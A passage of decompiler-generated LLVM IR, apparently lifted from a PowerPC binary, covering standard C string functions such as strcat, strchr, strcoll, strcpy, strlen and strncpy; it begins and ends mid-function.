  %v4_1000ec24 = icmp eq i32 %v1_1000ec24, 0
  store i1 %v4_1000ec24, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000ec24, label %dec_label_pc_1000ebdc, label %dec_label_pc_1000ec24.dec_label_pc_1000ebc4_crit_edge

dec_label_pc_1000ec24.dec_label_pc_1000ebc4_crit_edge: ; preds = %dec_label_pc_1000ec24
  %v0_1000ebc8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ebc4

dec_label_pc_1000ec30:                            ; preds = %dec_label_pc_1000ec00
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000ec24, { 1, 2, 0 }
  uselistorder i32 %v1_1000ec20, { 1, 0 }
  uselistorder i32 %v1_1000ec1c, { 1, 0 }
  uselistorder i32 %v1_1000ec04, { 1, 0 }
  uselistorder i32 %v4_1000ec00, { 1, 2, 0 }
  uselistorder i32 %v1_1000ebdc, { 2, 1, 0 }
  uselistorder i32 %v1_1000ebd8, { 1, 0 }
  uselistorder i32 %v1_1000ebd4, { 1, 0 }
  uselistorder i32 %v1_1000ebbc, { 1, 0 }
  uselistorder i32 %v0_1000ebbc, { 2, 1, 0 }
  uselistorder i8 %v2_1000ebb4, { 0, 2, 3, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ebf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebdc, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000ec38

dec_label_pc_1000ec38:                            ; preds = %dec_label_pc_1000ec38, %entry
  %v0_1000ec38 = phi i32 [ %v1_1000ec3c, %dec_label_pc_1000ec38 ], [ %tmp, %entry ]
  %v1_1000ec38 = inttoptr i32 %v0_1000ec38 to i8*
  %v2_1000ec38 = load i8, i8* %v1_1000ec38, align 1
  %v1_1000ec3c = add i32 %v0_1000ec38, 1
  %v3_1000ec40 = icmp eq i8 %v2_1000ec38, 0
  store i1 %v3_1000ec40, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ec40, label %dec_label_pc_1000ec48, label %dec_label_pc_1000ec38

dec_label_pc_1000ec48:                            ; preds = %dec_label_pc_1000ec38
  %v1_1000ec48 = add i32 %v0_1000ec38, -1
  br label %dec_label_pc_1000ec4c

dec_label_pc_1000ec4c:                            ; preds = %dec_label_pc_1000ec4c, %dec_label_pc_1000ec48
  %v2_1000ec58 = phi i32 [ %v3_1000ec58, %dec_label_pc_1000ec4c ], [ %v1_1000ec48, %dec_label_pc_1000ec48 ]
  %v0_1000ec4c = load i32, i32* @r4, align 4
  %v1_1000ec4c = inttoptr i32 %v0_1000ec4c to i8*
  %v2_1000ec4c = load i8, i8* %v1_1000ec4c, align 1
  %v1_1000ec50 = add i32 %v0_1000ec4c, 1
  store i32 %v1_1000ec50, i32* @r4, align 4
  %v3_1000ec54 = icmp eq i8 %v2_1000ec4c, 0
  store i1 %v3_1000ec54, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ec58 = add i32 %v2_1000ec58, 1
  %v4_1000ec58 = inttoptr i32 %v3_1000ec58 to i8*
  store i8 %v2_1000ec4c, i8* %v4_1000ec58, align 1
  %v0_1000ec5c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ec5c, label %dec_label_pc_1000ec60, label %dec_label_pc_1000ec4c

dec_label_pc_1000ec60:                            ; preds = %dec_label_pc_1000ec4c
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000ec58, { 1, 0 }
  uselistorder i32 %v0_1000ec38, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000ec64 = urem i32 %arg1, 256
  store i32 %v1_1000ec64, i32* %r4.global-to-local, align 4
  %v0_1000ec842 = load i32, i32* @r3, align 4
  %v1_1000ec843 = urem i32 %v0_1000ec842, 4
  %v3_1000ec845 = icmp eq i32 %v1_1000ec843, 0
  br i1 %v3_1000ec845, label %dec_label_pc_1000ec8c, label %dec_label_pc_1000ec6c

dec_label_pc_1000ec6c:                            ; preds = %entry, %dec_label_pc_1000ec80
  %v1_1000ec70 = phi i32 [ %v0_1000ec8c.pre, %dec_label_pc_1000ec80 ], [ %v1_1000ec64, %entry ]
  %v0_1000ec6c = phi i32 [ %v1_1000ec80, %dec_label_pc_1000ec80 ], [ %v0_1000ec842, %entry ]
  %v1_1000ec6c = inttoptr i32 %v0_1000ec6c to i8*
  %v2_1000ec6c = load i8, i8* %v1_1000ec6c, align 1
  %v3_1000ec6c = zext i8 %v2_1000ec6c to i32
  %v4_1000ec70 = icmp eq i32 %v3_1000ec6c, %v1_1000ec70
  %v3_1000ec74 = icmp eq i8 %v2_1000ec6c, 0
  %v0_1000ec78 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ec70, i32 %v0_1000ec78)
  br i1 %v3_1000ec74, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000ec80

dec_label_pc_1000ec80:                            ; preds = %dec_label_pc_1000ec6c
  %v0_1000ec80 = load i32, i32* @r3, align 4
  %v1_1000ec80 = add i32 %v0_1000ec80, 1
  store i32 %v1_1000ec80, i32* @r3, align 4
  %v1_1000ec84 = urem i32 %v1_1000ec80, 4
  %v3_1000ec84 = icmp eq i32 %v1_1000ec84, 0
  %v0_1000ec8c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000ec84, label %dec_label_pc_1000ec8c, label %dec_label_pc_1000ec6c

dec_label_pc_1000ec8c:                            ; preds = %dec_label_pc_1000ec80, %entry
  %v0_1000eca410 = phi i32 [ %v0_1000ec842, %entry ], [ %v1_1000ec80, %dec_label_pc_1000ec80 ]
  %v0_1000ec8c = phi i32 [ %v1_1000ec64, %entry ], [ %v0_1000ec8c.pre, %dec_label_pc_1000ec80 ]
  %v1_1000ec8c = mul i32 %v0_1000ec8c, 256
  %v2_1000ec94 = or i32 %v1_1000ec8c, %v0_1000ec8c
  %v1_1000ec9c = mul i32 %v2_1000ec94, 65536
  %v2_1000eca0 = or i32 %v1_1000ec9c, %v2_1000ec94
  br label %dec_label_pc_1000eca4

dec_label_pc_1000eca4:                            ; preds = %dec_label_pc_1000eca4, %dec_label_pc_1000ed58, %dec_label_pc_1000ec8c
  %v0_1000ecfc = phi i32 [ %v0_1000eca410, %dec_label_pc_1000ec8c ], [ %v1_1000eca8, %dec_label_pc_1000ed58 ], [ %v1_1000eca8, %dec_label_pc_1000eca4 ]
  %v1_1000eca4 = inttoptr i32 %v0_1000ecfc to i32*
  %v2_1000eca4 = load i32, i32* %v1_1000eca4, align 4
  %v1_1000eca8 = add i32 %v0_1000ecfc, 4
  %v2_1000ecb0 = xor i32 %v2_1000eca4, %v2_1000eca0
  %v1_1000ecb4 = add i32 %v2_1000eca4, 2130640639
  %v2_1000ecbc = xor i32 %v1_1000ecb4, %v2_1000eca4
  %v1_1000ecc0 = add i32 %v2_1000ecb0, 2130640639
  %v2_1000ecc4 = and i32 %v2_1000ecbc, -2130640640
  %v3_1000ecc4 = xor i32 %v2_1000ecc4, -2130640640
  %v2_1000ecc8 = xor i32 %v1_1000ecc0, %v2_1000ecb0
  %v2_1000eccc = and i32 %v2_1000ecc8, -2130640640
  %v3_1000eccc = xor i32 %v2_1000eccc, -2130640640
  %v1_1000ecd8 = add i32 %v0_1000ecfc, 1
  %tmp = or i32 %v3_1000eccc, %v3_1000ecc4
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000eca4, label %dec_label_pc_1000ece4

dec_label_pc_1000ece4:                            ; preds = %dec_label_pc_1000eca4
  %v2_1000ece4 = inttoptr i32 %v0_1000ecfc to i8*
  %v3_1000ece4 = load i8, i8* %v2_1000ece4, align 1
  %v4_1000ece4 = zext i8 %v3_1000ece4 to i32
  %v1_1000ece8 = add i32 %v0_1000ecfc, 2
  %v1_1000ecec = add i32 %v0_1000ecfc, 3
  %v4_1000ecf0 = icmp eq i32 %v4_1000ece4, %v0_1000ec8c
  br i1 %v4_1000ecf0, label %dec_label_pc_1000ecfc, label %dec_label_pc_1000ed04

dec_label_pc_1000ecfc:                            ; preds = %dec_label_pc_1000ece4
  ret i32 %v0_1000ecfc

dec_label_pc_1000ed04:                            ; preds = %dec_label_pc_1000ece4
  %v3_1000ecf4 = icmp eq i8 %v3_1000ece4, 0
  br i1 %v3_1000ecf4, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000ed08

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ed04
  %v2_1000ed08 = inttoptr i32 %v1_1000ecd8 to i8*
  %v3_1000ed08 = load i8, i8* %v2_1000ed08, align 1
  %v4_1000ed08 = zext i8 %v3_1000ed08 to i32
  %v4_1000ed0c = icmp eq i32 %v4_1000ed08, %v0_1000ec8c
  br i1 %v4_1000ed0c, label %dec_label_pc_1000ed18, label %dec_label_pc_1000ed20

dec_label_pc_1000ed18:                            ; preds = %dec_label_pc_1000ed08
  ret i32 %v1_1000ecd8

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ed08
  %v3_1000ed10 = icmp eq i8 %v3_1000ed08, 0
  br i1 %v3_1000ed10, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000ed24

dec_label_pc_1000ed24:                            ; preds = %dec_label_pc_1000ed20
  %v2_1000ed24 = inttoptr i32 %v1_1000ece8 to i8*
  %v3_1000ed24 = load i8, i8* %v2_1000ed24, align 1
  %v4_1000ed24 = zext i8 %v3_1000ed24 to i32
  %v4_1000ed28 = icmp eq i32 %v4_1000ed24, %v0_1000ec8c
  br i1 %v4_1000ed28, label %dec_label_pc_1000ed34, label %dec_label_pc_1000ed3c

dec_label_pc_1000ed34:                            ; preds = %dec_label_pc_1000ed24
  ret i32 %v1_1000ece8

dec_label_pc_1000ed3c:                            ; preds = %dec_label_pc_1000ed24
  %v3_1000ed2c = icmp eq i8 %v3_1000ed24, 0
  br i1 %v3_1000ed2c, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000ed40

dec_label_pc_1000ed40:                            ; preds = %dec_label_pc_1000ed3c
  %v2_1000ed40 = inttoptr i32 %v1_1000ecec to i8*
  %v3_1000ed40 = load i8, i8* %v2_1000ed40, align 1
  %v4_1000ed40 = zext i8 %v3_1000ed40 to i32
  %v4_1000ed44 = icmp eq i32 %v4_1000ed40, %v0_1000ec8c
  br i1 %v4_1000ed44, label %dec_label_pc_1000ed50, label %dec_label_pc_1000ed58

dec_label_pc_1000ed50:                            ; preds = %dec_label_pc_1000ed40
  ret i32 %v1_1000ecec

dec_label_pc_1000ed58:                            ; preds = %dec_label_pc_1000ed40
  %v3_1000ed48 = icmp eq i8 %v3_1000ed40, 0
  br i1 %v3_1000ed48, label %dec_label_pc_1000ed5c, label %dec_label_pc_1000eca4

dec_label_pc_1000ed5c:                            ; preds = %dec_label_pc_1000ec6c, %dec_label_pc_1000ed58, %dec_label_pc_1000ed3c, %dec_label_pc_1000ed20, %dec_label_pc_1000ed04
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000eca8, { 1, 0 }
  uselistorder i32 %v2_1000eca4, { 0, 2, 1 }
  uselistorder i32 %v0_1000ecfc, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000ec94, { 1, 0 }
  uselistorder i32 %v0_1000ec8c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000ec80, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000ec842, { 2, 1, 0 }
  uselistorder i32 %v1_1000ec64, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ed5c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000eca4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ec6c, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000ed70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ed68

dec_label_pc_1000ed68:                            ; preds = %dec_label_pc_1000ed8c, %entry
  %v0_1000ed70 = phi i32 [ %v1_1000ed74, %dec_label_pc_1000ed8c ], [ %v0_1000ed70.pre, %entry ]
  %v0_1000ed68 = phi i32 [ %v1_1000ed6c, %dec_label_pc_1000ed8c ], [ %tmp, %entry ]
  %v1_1000ed68 = inttoptr i32 %v0_1000ed68 to i8*
  %v2_1000ed68 = load i8, i8* %v1_1000ed68, align 1
  %v3_1000ed68 = zext i8 %v2_1000ed68 to i32
  %v1_1000ed70 = inttoptr i32 %v0_1000ed70 to i8*
  %v2_1000ed70 = load i8, i8* %v1_1000ed70, align 1
  %v3_1000ed70 = zext i8 %v2_1000ed70 to i32
  %v3_1000ed78 = icmp eq i8 %v2_1000ed68, 0
  br i1 %v3_1000ed78, label %dec_label_pc_1000ed84, label %dec_label_pc_1000ed8c

dec_label_pc_1000ed84:                            ; preds = %dec_label_pc_1000ed68
  %v1_1000ed84 = sub nsw i32 0, %v3_1000ed70
  ret i32 %v1_1000ed84

dec_label_pc_1000ed8c:                            ; preds = %dec_label_pc_1000ed68
  %v4_1000ed7c = icmp eq i8 %v2_1000ed68, %v2_1000ed70
  %v1_1000ed74 = add i32 %v0_1000ed70, 1
  %v1_1000ed6c = add i32 %v0_1000ed68, 1
  br i1 %v4_1000ed7c, label %dec_label_pc_1000ed68, label %dec_label_pc_1000ed90

dec_label_pc_1000ed90:                            ; preds = %dec_label_pc_1000ed8c
  %v2_1000ed90 = sub nsw i32 %v3_1000ed68, %v3_1000ed70
  ret i32 %v2_1000ed90

; uselistorder directives
  uselistorder i32 %v3_1000ed70, { 1, 0 }
  uselistorder i32 %v0_1000ed68, { 1, 0 }
  uselistorder i32 %v0_1000ed70, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000ed98 = add i32 %arg1, -1
  %v1_1000ed9c = sub i32 %v2_1000ed98, %tmp
  store i32 %v1_1000ed9c, i32* %r9.global-to-local, align 4
  %v2_1000eda04 = load i8, i8* %arg2, align 1
  %v1_1000eda46 = add i32 %tmp, 1
  store i32 %v1_1000eda46, i32* %r4.global-to-local, align 4
  %v3_1000eda88 = icmp eq i8 %v2_1000eda04, 0
  store i1 %v3_1000eda88, i1* %cr7_eq.global-to-local, align 1
  %v5_1000edac9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000eda04, i8* %v5_1000edac9, align 1
  %v0_1000edb010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000edb010, label %dec_label_pc_1000edb4, label %dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge

dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge: ; preds = %entry, %dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge
  %v0_1000eda0.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000edac.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000eda0 = inttoptr i32 %v0_1000eda0.pre to i8*
  %v2_1000eda0 = load i8, i8* %v1_1000eda0, align 1
  %v1_1000eda4 = add i32 %v0_1000eda0.pre, 1
  store i32 %v1_1000eda4, i32* %r4.global-to-local, align 4
  %v3_1000eda8 = icmp eq i8 %v2_1000eda0, 0
  store i1 %v3_1000eda8, i1* %cr7_eq.global-to-local, align 1
  %v4_1000edac = add i32 %v1_1000eda4, %v2_1000edac.pre
  %v5_1000edac = inttoptr i32 %v4_1000edac to i8*
  store i8 %v2_1000eda0, i8* %v5_1000edac, align 1
  %v0_1000edb0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000edb0, label %dec_label_pc_1000edb4, label %dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge

dec_label_pc_1000edb4:                            ; preds = %dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eda0.dec_label_pc_1000eda0_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000edb8 = load i32, i32* @r3, align 4
  %v1_1000edd03 = urem i32 %v0_1000edb8, 4
  %v3_1000edd05 = icmp eq i32 %v1_1000edd03, 0
  br i1 %v3_1000edd05, label %dec_label_pc_1000edd8, label %dec_label_pc_1000edc0

dec_label_pc_1000edc0:                            ; preds = %entry, %dec_label_pc_1000edcc
  %v0_1000edcc = phi i32 [ %v1_1000edcc, %dec_label_pc_1000edcc ], [ %v0_1000edb8, %entry ]
  %v1_1000edc0 = inttoptr i32 %v0_1000edcc to i8*
  %v2_1000edc0 = load i8, i8* %v1_1000edc0, align 1
  %v3_1000edc4 = icmp eq i8 %v2_1000edc0, 0
  br i1 %v3_1000edc4, label %dec_label_pc_1000ee0c, label %dec_label_pc_1000edcc

dec_label_pc_1000edcc:                            ; preds = %dec_label_pc_1000edc0
  %v1_1000edcc = add i32 %v0_1000edcc, 1
  %v1_1000edd0 = urem i32 %v1_1000edcc, 4
  %v3_1000edd0 = icmp eq i32 %v1_1000edd0, 0
  br i1 %v3_1000edd0, label %dec_label_pc_1000edd8, label %dec_label_pc_1000edc0

dec_label_pc_1000edd8:                            ; preds = %dec_label_pc_1000edcc, %entry
  %v0_1000eddc = phi i32 [ %v0_1000edb8, %entry ], [ %v1_1000edcc, %dec_label_pc_1000edcc ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000ede4

dec_label_pc_1000ede4:                            ; preds = %dec_label_pc_1000ee44, %dec_label_pc_1000ede4, %dec_label_pc_1000edd8
  %v1_1000ee20 = phi i32 [ %v0_1000eddc, %dec_label_pc_1000edd8 ], [ %v1_1000ede8, %dec_label_pc_1000ede4 ], [ %v1_1000ede8, %dec_label_pc_1000ee44 ]
  %v1_1000ede4 = inttoptr i32 %v1_1000ee20 to i32*
  %v2_1000ede4 = load i32, i32* %v1_1000ede4, align 4
  %v1_1000ede8 = add i32 %v1_1000ee20, 4
  %v1_1000edf4 = add i32 %v2_1000ede4, -16843009
  %v2_1000edf8 = and i32 %v1_1000edf4, -2139062144
  %v5_1000edf8 = icmp eq i32 %v2_1000edf8, 0
  br i1 %v5_1000edf8, label %dec_label_pc_1000ede4, label %dec_label_pc_1000ee00

dec_label_pc_1000ee00:                            ; preds = %dec_label_pc_1000ede4
  %v2_1000ee00 = inttoptr i32 %v1_1000ee20 to i8*
  %v3_1000ee00 = load i8, i8* %v2_1000ee00, align 1
  %v3_1000ee04 = icmp eq i8 %v3_1000ee00, 0
  br i1 %v3_1000ee04, label %dec_label_pc_1000ee0c, label %dec_label_pc_1000ee14

dec_label_pc_1000ee0c:                            ; preds = %dec_label_pc_1000edc0, %dec_label_pc_1000ee00
  %v1_1000ee0c = phi i32 [ %v1_1000ee20, %dec_label_pc_1000ee00 ], [ %v0_1000edcc, %dec_label_pc_1000edc0 ]
  %v2_1000ee0c = sub i32 %v1_1000ee0c, %v0_1000edb8
  ret i32 %v2_1000ee0c

dec_label_pc_1000ee14:                            ; preds = %dec_label_pc_1000ee00
  %v1_1000ee14 = add i32 %v1_1000ee20, 1
  %v2_1000ee14 = inttoptr i32 %v1_1000ee14 to i8*
  %v3_1000ee14 = load i8, i8* %v2_1000ee14, align 1
  %v3_1000ee18 = icmp eq i8 %v3_1000ee14, 0
  br i1 %v3_1000ee18, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ee2c

dec_label_pc_1000ee20:                            ; preds = %dec_label_pc_1000ee14
  %v2_1000ee20 = sub i32 %v1_1000ee20, %v0_1000edb8
  %v1_1000ee24 = add i32 %v2_1000ee20, 1
  ret i32 %v1_1000ee24

dec_label_pc_1000ee2c:                            ; preds = %dec_label_pc_1000ee14
  %v1_1000ee2c = add i32 %v1_1000ee20, 2
  %v2_1000ee2c = inttoptr i32 %v1_1000ee2c to i8*
  %v3_1000ee2c = load i8, i8* %v2_1000ee2c, align 1
  %v3_1000ee30 = icmp eq i8 %v3_1000ee2c, 0
  br i1 %v3_1000ee30, label %dec_label_pc_1000ee38, label %dec_label_pc_1000ee44

dec_label_pc_1000ee38:                            ; preds = %dec_label_pc_1000ee2c
  %v2_1000ee38 = sub i32 %v1_1000ee20, %v0_1000edb8
  %v1_1000ee3c = add i32 %v2_1000ee38, 2
  ret i32 %v1_1000ee3c

dec_label_pc_1000ee44:                            ; preds = %dec_label_pc_1000ee2c
  %v1_1000ee44 = add i32 %v1_1000ee20, 3
  %v2_1000ee44 = inttoptr i32 %v1_1000ee44 to i8*
  %v3_1000ee44 = load i8, i8* %v2_1000ee44, align 1
  %v3_1000ee48 = icmp eq i8 %v3_1000ee44, 0
  br i1 %v3_1000ee48, label %dec_label_pc_1000ee50, label %dec_label_pc_1000ede4

dec_label_pc_1000ee50:                            ; preds = %dec_label_pc_1000ee44
  %v2_1000ee50 = sub i32 %v1_1000ee20, %v0_1000edb8
  %v1_1000ee54 = add i32 %v2_1000ee50, 3
  ret i32 %v1_1000ee54

; uselistorder directives
  uselistorder i32 %v1_1000ede8, { 1, 0 }
  uselistorder i32 %v1_1000ee20, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000edcc, { 1, 0, 2 }
  uselistorder i32 %v0_1000edb8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ee0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000edc0, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000ee5c = icmp eq i32 %arg2, 3
  store i1 %v3_1000ee5c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000ee60 = add i32 %arg1, -1
  store i32 %v1_1000ee60, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000eedc, label %dec_label_pc_1000ee68

dec_label_pc_1000ee68:                            ; preds = %entry
  %v1_1000ee68 = udiv i32 %arg2, 4
  store i32 %v1_1000ee68, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ee70

dec_label_pc_1000ee70:                            ; preds = %dec_label_pc_1000eec0, %dec_label_pc_1000ee68
  %v2_1000ee80 = phi i32 [ %v3_1000eeb8, %dec_label_pc_1000eec0 ], [ %v1_1000ee60, %dec_label_pc_1000ee68 ]
  %v0_1000ee70 = load i32, i32* @r4, align 4
  %v1_1000ee70 = inttoptr i32 %v0_1000ee70 to i8*
  %v2_1000ee70 = load i8, i8* %v1_1000ee70, align 1
  %v1_1000ee74 = add i32 %v0_1000ee70, 1
  store i32 %v1_1000ee74, i32* %r10.global-to-local, align 4
  %v1_1000ee78 = add i32 %v0_1000ee70, 2
  store i32 %v1_1000ee78, i32* @r8, align 4
  %v3_1000ee7c = icmp eq i8 %v2_1000ee70, 0
  store i1 %v3_1000ee7c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ee80 = add i32 %v2_1000ee80, 1
  %v4_1000ee80 = inttoptr i32 %v3_1000ee80 to i8*
  store i8 %v2_1000ee70, i8* %v4_1000ee80, align 1
  store i32 %v3_1000ee80, i32* %r11.global-to-local, align 4
  %v0_1000ee84 = load i32, i32* @r8, align 4
  %v1_1000ee84 = add i32 %v0_1000ee84, 1
  store i32 %v1_1000ee84, i32* %r9.global-to-local, align 4
  %v0_1000ee88 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ee88, label %dec_label_pc_1000eec8, label %dec_label_pc_1000ee8c

dec_label_pc_1000ee8c:                            ; preds = %dec_label_pc_1000ee70
  %v0_1000ee8c = load i32, i32* @r4, align 4
  %v1_1000ee8c = add i32 %v0_1000ee8c, 1
  %v2_1000ee8c = inttoptr i32 %v1_1000ee8c to i8*
  %v3_1000ee8c = load i8, i8* %v2_1000ee8c, align 1
  %v1_1000ee90 = add i32 %v0_1000ee84, 2
  store i32 %v1_1000ee90, i32* @r4, align 4
  %v3_1000ee94 = icmp eq i8 %v3_1000ee8c, 0
  store i1 %v3_1000ee94, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ee98 = add i32 %v2_1000ee80, 2
  %v4_1000ee98 = inttoptr i32 %v3_1000ee98 to i8*
  store i8 %v3_1000ee8c, i8* %v4_1000ee98, align 1
  store i32 %v3_1000ee98, i32* %r11.global-to-local, align 4
  %v0_1000ee9c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ee9c, label %dec_label_pc_1000eec8, label %dec_label_pc_1000eea0

dec_label_pc_1000eea0:                            ; preds = %dec_label_pc_1000ee8c
  %v0_1000eea0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000eea0 = add i32 %v0_1000eea0, 1
  %v2_1000eea0 = inttoptr i32 %v1_1000eea0 to i8*
  %v3_1000eea0 = load i8, i8* %v2_1000eea0, align 1
  %v3_1000eea4 = icmp eq i8 %v3_1000eea0, 0
  store i1 %v3_1000eea4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000eea8 = add i32 %v2_1000ee80, 3
  %v4_1000eea8 = inttoptr i32 %v3_1000eea8 to i8*
  store i8 %v3_1000eea0, i8* %v4_1000eea8, align 1
  store i32 %v3_1000eea8, i32* %r11.global-to-local, align 4
  %v0_1000eeac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000eeac, label %dec_label_pc_1000eec8, label %dec_label_pc_1000eeb0

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000eea0
  %v0_1000eeb0 = load i32, i32* @r8, align 4
  %v1_1000eeb0 = add i32 %v0_1000eeb0, 1
  %v2_1000eeb0 = inttoptr i32 %v1_1000eeb0 to i8*
  %v3_1000eeb0 = load i8, i8* %v2_1000eeb0, align 1
  %v3_1000eeb4 = icmp eq i8 %v3_1000eeb0, 0
  store i1 %v3_1000eeb4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000eeb8 = add i32 %v2_1000ee80, 4
  %v4_1000eeb8 = inttoptr i32 %v3_1000eeb8 to i8*
  store i8 %v3_1000eeb0, i8* %v4_1000eeb8, align 1
  store i32 %v3_1000eeb8, i32* %r11.global-to-local, align 4
  %v0_1000eebc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000eebc, label %dec_label_pc_1000eec8, label %dec_label_pc_1000eec0

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000eeb0
  %v0_1000eec0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eec0 = add i32 %v0_1000eec0, -1
  store i32 %v1_1000eec0, i32* %ctr.global-to-local, align 4
  %v2_1000eec0 = icmp eq i32 %v1_1000eec0, 0
  br i1 %v2_1000eec0, label %dec_label_pc_1000eedc, label %dec_label_pc_1000ee70

dec_label_pc_1000eec8:                            ; preds = %dec_label_pc_1000eeb0, %dec_label_pc_1000eea0, %dec_label_pc_1000ee8c, %dec_label_pc_1000ee70
  %v1_1000eec8 = phi i32 [ %v3_1000eeb8, %dec_label_pc_1000eeb0 ], [ %v3_1000eea8, %dec_label_pc_1000eea0 ], [ %v3_1000ee98, %dec_label_pc_1000ee8c ], [ %v3_1000ee80, %dec_label_pc_1000ee70 ]
  %v2_1000eec811 = sub i32 %arg1, %v1_1000eec8
  %v2_1000eecc = add i32 %v2_1000eec811, %arg2
  %v1_1000eed0 = add i32 %v2_1000eecc, -1
  store i32 %v1_1000eed0, i32* %r9.global-to-local, align 4
  %v4_1000eed0 = icmp eq i32 %v1_1000eed0, 0
  %v0_1000eed4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000eed0, i32 %v0_1000eed4)
  %v2_1000ef0c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ef04

dec_label_pc_1000eedc:                            ; preds = %dec_label_pc_1000eec0, %entry
  %v1_1000eedc = urem i32 %arg2, 4
  store i32 %v1_1000eedc, i32* %r9.global-to-local, align 4
  %v3_1000eedc = icmp eq i32 %v1_1000eedc, 0
  %v0_1000eee0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eedc, i32 %v0_1000eee0)
  store i32 %v1_1000eedc, i32* %ctr.global-to-local, align 4
  %v2_1000eef8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000eee8

dec_label_pc_1000eee8:                            ; preds = %dec_label_pc_1000ef00.dec_label_pc_1000eee8_crit_edge, %dec_label_pc_1000eedc
